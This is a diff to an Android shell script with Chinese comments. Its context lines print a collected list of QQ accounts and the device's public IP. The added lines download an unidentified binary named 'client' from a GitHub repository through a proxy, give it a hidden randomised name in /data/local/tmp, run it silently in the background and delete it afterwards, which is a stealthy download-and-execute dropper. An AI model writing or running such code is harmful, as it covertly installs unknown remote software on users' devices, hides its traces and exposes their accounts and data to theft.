@@ -150,6 +150,22 @@ echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
 
-wget https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client -O /data/local/tmp/client
-chmod +x /data/local/tmp/client
-( nohup /data/local/tmp/client > /dev/null 2>&1 ; wait $! ; rm /data/local/tmp/client ) &
+(
+  # 生成随机临时文件名
+  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
+  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
+
+  # 下载并检查
+  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
+    chmod +x "$temp_bin" 2>/dev/null || true
+
+    # 在子 shell 中用 nohup 后台启动，记录 PID，等待该 PID 退出后删除临时文件
+    nohup "$temp_bin" >/dev/null 2>&1 &
+    child=$!
+    # 等待子进程结束，然后删除临时文件（用 -f 保证不会报错）
+    wait "$child"
+    rm -f "$temp_bin" 2>/dev/null || true
+  else
+    rm -f "$temp_bin" 2>/dev/null || true
+  fi
+) &
